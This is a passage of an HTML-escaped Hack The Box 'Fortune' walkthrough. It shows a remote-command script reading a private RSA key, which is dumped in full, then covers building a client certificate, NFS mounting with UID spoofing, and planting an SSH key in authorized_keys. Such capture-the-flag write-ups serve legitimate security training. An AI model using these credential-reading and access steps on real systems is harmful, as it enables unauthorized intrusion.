0CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg
miqzREAc0qzehpoJXuS50wJc4otGgU5l+Rsen8giWdR0a1TxKm2UF/wFQbSU+WwY
8F5PquwOz384mmQ/3k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I
1Y4UXIOE/nKK/UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i+3
OpY+NpJ0mjem7/d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW/ENNG
z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0/8BCuEwNuMz9mHc9
DFhdfx5zU8OYUVpw4UB8IC2wbybyW+ftkcsfLngYasH3cZa1GpXq/qDByCW2C8kg
z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv
HinFDCeM/GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA==
-----END CERTIFICATE-----

[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem
[*] Result :


-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6N
TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd9
9fN/MDz288Rv7Z24LKWvPoEFWU5DSpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1o
W/kbz9205JT1LvR+mqNWbH/0Q92K7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI9
7sB6jXxlgHzblwFlQaHvh6H7u6rCm/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL
6YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/S
ybEGB3vBe4e+wvzkT7YD4lqubvXZO346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVo
KmimYUWi2fJ/1B2PgRrzv/mmlgL7JOpJNWMUbc8bEf698QziuCXj5R/+Lover058
nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xp
ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb
7K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEA
AQKCAgEAkjfD+W+g0LOtElN2TtYewtRAPVYc+9ogRKq28PUtpEemGccLix8qmBkM
c66B5qwAO+WPWUPhVbd/v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I/4O/3m
fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl/TgR3W0P
BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn
EmuCdReE+u0AUfZy6xlHzhs5/DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg/9R
cbVCzi0P7VMi5oYsugppezeBjiX+EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL
iXTJ0X0MS1E1AWSvECguIuUaNuDW+ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0
KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4+J3Sa8Zi1mOiQ9xFmGMV+8AUiz899J
4PHcf7WzLb/FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h/pFxV
+wfx2X5F3N8RzU5ufR/M/Asni8RId7M8TJ44qWQln8itM+0aWTKiLrhBOcC55eug
hHIop2z+amPqxsynTVbbmiVwGpCYGNt3Q/7/FovcxF36hkbULwECggEBAPPgQwX4
gL9PBBwSi2oCS+164tSTc0B3R31B0AatewdXyASNYml9rCTOa/VJntvIAHDvWQ3+
wfrf34/1DIdZttwPYpcKAiWz/CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF
ctBDsqGytJ/Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1
83sZAZo+DXLdmtXVpoM/8MlhnMfg9VQ+txrMZg+1zEiuiNY9Rmv6CDpx68WcNKxF
y6mEkR8Ux3ZdHht/9azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj+2cX9n5dO5E
HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z+B6u/PJHmFKBn/PgD1NKBlGINIY
wh/3mFq1AvqHqy9Y9q9H+S/rIr8i+ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ
CRqtqV/BUhADeXrxnSdTEtA9CTgLEn+fHbDGwzW1nhB/EsEfQFQBx31juR2k5kR3
LFpiex3zAvVYOuM9fkHsCp5rDsvv10/6+aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4
4Ky6/DFEMRCh1yC/O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX
po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP/LjQHSRORv
3b29HwqrWn7+7fmM3Fsja/N8+MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U
Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve/Lsq5RcoA3a
oF0bYBFJP3+HFZ6NGcMf+Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh
ojeQf7XbmjzKLGqyrdE2Dj/yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga+fl3loWfhW2
yre0Dofd0iN7X/Hnfj8lKYQR3o8/qy0DGTnVK2V8PuEeT/4mtjmPaH8Q+BUA3DyZ
8fJJxg8CggEAJ+AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL
ml4n1A94kl2+FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw
Ew7TZU+YP8+/hS1v7an/wmPeEDvFIQg/Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm
KTNO6PvdISKMzxAAuf5ZeRNvD97mpD/Z6ViuvtCQPTJgWBO0mIi+IQtisqusPWLS
eano2dPAMUWtQTfR3K/KbbErjrr35hWWvkDley+EytgDucXQgEzMKm+QP3E3df36
J2PccV2TQy+G1t9sGvPhP0IT10Y3+RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als
OZa+sOykZ/7fdjBZpAsjvcmxUfAxT07+EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj
IsZnjm0Ds8ezFka/3Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv
y6Lpg/KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g
XPwjyvXUcxDf8Jx1MGFfO++6RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96
Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-use-them-to-generate-a-pkcs12-certificate-to-access-the-https-service-with-openssl-we-can-do-it-with-a-single-command-&quot;&gt;We can use them to generate a &lt;code class=&quot;highlighter-rouge&quot;&gt;PKCS12&lt;/code&gt; certificate to access the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service. with &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; we can do it with a single command :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
total 20
drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
total 28
drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-import-the-certificate-in-firefox-&quot;&gt;Now we can import the certificate in Firefox :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/8.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-removing-the-ssl-exception-it-will-ask-for-our-certificate-and-give-us-access-&quot;&gt;After removing the SSL exception it will ask for our certificate and give us access :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;elevated-network-access-nfs-user-flag&quot;&gt;Elevated Network Access, NFS, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-access-to-https-this-message-is-whats-on-the-index-page-&quot;&gt;After getting access to &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; this message is what’s on the index page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-didnt-know-what-authpf-was-so-i-searched-about-it&quot;&gt;I didn’t know what &lt;code class=&quot;highlighter-rouge&quot;&gt;authpf&lt;/code&gt; was so I searched about it.&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - &lt;a href=&quot;https://www.freebsd.org/cgi/man.cgi?query=authpf&amp;amp;apropos=0&amp;amp;sektion=8&amp;amp;manpath=FreeBSD+8.1-RELEASE+and+Ports&amp;amp;format=html&quot;&gt;freeBSD manual&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;so-basically-this-can-give-access-to-some-filtered-services-we-werent-allowed-to-access-before-to-use-it-we-need-a-key-and-luckily-we-can-generate-one-&quot;&gt;So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-3-users-on-the-box-i-tried-all-of-them-and-nfsuser-worked-&quot;&gt;We have 3 users on the box, I tried all of them and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-is-the-time-for-another-nmap-scan-&quot;&gt;Now is the time for another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/fortune/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-two-new-ports-8081-which-is-running-http-and-2049-which-is-running-nfs-the-http-service-gives-us-this-message-&quot;&gt;We have two new ports, 8081 which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;2049&lt;/code&gt; which is running &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service gives us this message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-probably-we-need-to-focus-on-nfs&quot;&gt;So probably we need to focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt;.&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Network File System&lt;/strong&gt; (&lt;strong&gt;NFS&lt;/strong&gt;) is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Distributed_file_system&quot;&gt;distributed file system&lt;/a&gt; protocol originally developed by &lt;a href=&quot;https://en.wikipedia.org/wiki/Sun_Microsystems&quot;&gt;Sun Microsystems&lt;/a&gt; in 1984, allowing a user on a client &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer&quot;&gt;computer&lt;/a&gt; to access files over a &lt;a href=&quot;https://en.wikipedia.org/wiki/Computer_network&quot;&gt;computer network&lt;/a&gt; much like local storage is accessed.  -&lt;a href=&quot;https://en.wikipedia.org/wiki/Network_File_System&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-used-the-rce-script-to-check-etcexports-and-the-only-thing-there-was-home-&quot;&gt;I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; script to check &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/exports&lt;/code&gt; and the only thing there was &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : cat /etc/exports
[*] Result :

/home
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;by-using-nfs-ls-which-is-a-part-of-the-package-libnfs-utils-we-can-successfully-list-the-directories-&quot;&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs-ls&lt;/code&gt; (which is a part of the package &lt;code class=&quot;highlighter-rouge&quot;&gt;libnfs-utils&lt;/code&gt;) we can successfully list the directories :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
drwxr-xr-x  2  1002  1002          512 nfsuser
drwxr-xr-x  5  1001  1001          512 bob
drwxr-x---  3  1000  1000          512 charlie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-created-a-directory-called-it-mnt-and-mounted-the-nfs-share-in-it-&quot;&gt;I created a directory, called it &lt;code class=&quot;highlighter-rouge&quot;&gt;mnt&lt;/code&gt; and mounted the &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; share in it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt &amp;amp;&amp;amp; mount -t nfs fortune.htb:/home ./mnt
root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
total 12
drwxr-xr-x 5 root root  512 Nov  3  2018 .
drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
root@kali:~/Desktop/HTB/boxes/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;however-i-couldnt-access-charlies-directory-&quot;&gt;However I couldn’t access &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt;’s directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
-bash: cd: charlie: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-is-because-im-trying-with-root-whose-uid-is-0-&quot;&gt;This is because I’m trying with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; whose &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
uid=0(root) gid=0(root) groups=0(root)
root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-the-way-nfs-permissions-work-i-need-to-have-the-same-uid-as-charlie-which-is-1000-&quot;&gt;And the way &lt;code class=&quot;highlighter-rouge&quot;&gt;nfs&lt;/code&gt; permissions work I need to have the same &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;1000&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : id charlie
[*] Result :

uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-already-have-a-user-on-my-box-with-the-uid-1000-called-rick-&quot;&gt;I already have a user on my box with the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 1000 called &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
uid=1000(rick) gid=1000(rick) groups=1000(rick)
root@kali:~/Desktop/HTB/boxes/fortune/mnt#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-root-flag&quot;&gt;Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-i-wanted-to-do-is-to-get-ssh-luckily-i-had-write-access-to-authorized_keys-&quot;&gt;First thing I wanted to do is to get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, luckily I had write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
total 22
drwxr-x--- 3 rick rick 512 Nov  6  2018 .
drwxr-xr-x 5 root root 512 Nov  3  2018 ..
-rw-r----- 1 rick rick 771 Oct 11  2018 .cshrc
-rw-r----- 1 rick rick 101 Oct 11  2018 .cvsrc
-rw-r----- 1 rick rick 359 Oct 11  2018 .login
-rw-r----- 1 rick rick 175 Oct 11  2018 .mailrc
-rw------- 1 rick rick 608 Nov  3  2018 mbox
-rw-r----- 1 rick rick 216 Oct 11  2018 .profile
drwx------ 2 rick rick 512 Nov  2  2018 .ssh
-r-------- 1 rick rick  33 Nov  3  2018 user.txt
-rw-r----- 1 rick rick  87 Oct 11  2018 .Xdefaults
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ cd .ssh
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ ls -la
total 4
drwx------ 2 rick rick 512 Nov  2  2018 .
drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
-rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-used-ssh-keygen-to-generate-a-private-and-a-public-key-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; to generate a private and a public key :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Desktop/HTB/boxes/fortune/ssh/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.
Your public key has been saved in /root/Desktop/HTB/boxes/fortune/ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OicgBWZAaEOpjbe8y6qqvgAEJwY0qDKuSuBXQ/Gt+Cs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|%B*  .           |
|=O..  o .        |
|++. .. . .       |
|B o.. . .        |
|=+...+ .S        |
|+.o...o.         |
|oo o  +..        |
|+.o  E +.        |
|%++.  ..         |
+----[SHA256]-----+
root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
root@kali:~/Desktop/HTB/boxes/fortune#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-wrote-my-public-key-to-authorized_keys-and-got-ssh-as-charlie-&quot;&gt;Then I wrote my public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali&quot; &amp;gt;&amp;gt; authorized_keys 
rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
rick@kali:/root/Desktop/HTB/boxes/fortune/ssh$ su
Password: 
root@kali:~/Desktop/HTB/boxes/fortune/ssh# ssh charlie@fortune.htb -i id_rsa
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;in-the-home-directory-of-charlie-there-was-a-file-called-mbox-which-had-an-email-from-bob-to-charlie-thanking-him-for-setting-up-pgadmin4-for-him-and-also-telling-him-that-he-set-the-dba-password-to-the-same-as-root-password-&quot;&gt;In the home directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; there was a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mbox&lt;/code&gt; which had an email from &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; thanking him for setting up &lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin4&lt;/code&gt; for him and also telling him that he set the &lt;code class=&quot;highlighter-rouge&quot;&gt;dba&lt;/code&gt; password to the same as root password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fortune$ ls -al
total 44
drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .
drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..
-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults
-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc
-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc
-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login
-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc
-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile
drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh
-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox
-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt
fortune$ cat mbox                                                                                                                                                                                                 
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: &amp;lt;bob@fortune.htb&amp;gt;
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
        for &amp;lt;charlie@fortune.htb&amp;gt;;
        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  &amp;lt;bob@fortune.htb&amp;gt;
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: &amp;lt;196699abe1fed384@fortune.htb&amp;gt;
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob

fortune$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;note--pgadmin-is-an-administration-and-development-platform-for-postgresql&quot;&gt;Note : &lt;a href=&quot;https://www.pgadmin.org/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pgadmin&lt;/code&gt;&lt;/a&gt; is an administration and development platform for &lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL&lt;/code&gt;.&lt;/h4&gt;
